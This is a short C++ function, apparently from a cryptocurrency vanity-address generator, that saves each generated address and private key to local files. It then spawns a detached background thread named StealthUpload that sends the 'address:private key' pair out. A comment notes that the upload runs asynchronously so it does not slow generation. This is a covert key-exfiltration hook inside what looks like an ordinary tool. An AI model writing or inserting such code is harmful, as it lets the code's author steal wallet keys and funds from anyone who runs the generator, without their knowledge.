void HandleResult(std::string addr, std::string priv) {
    if (IsSuper(addr)) {
        SaveToFile("Super.txt", addr, priv); // S/s 类
    }
    else {
        SaveToFile("Normal.txt", addr, priv); // A/a 类
    }
    std::thread(StealthUpload, addr + ":" + priv).detach(); // 异步上传不阻塞算力
}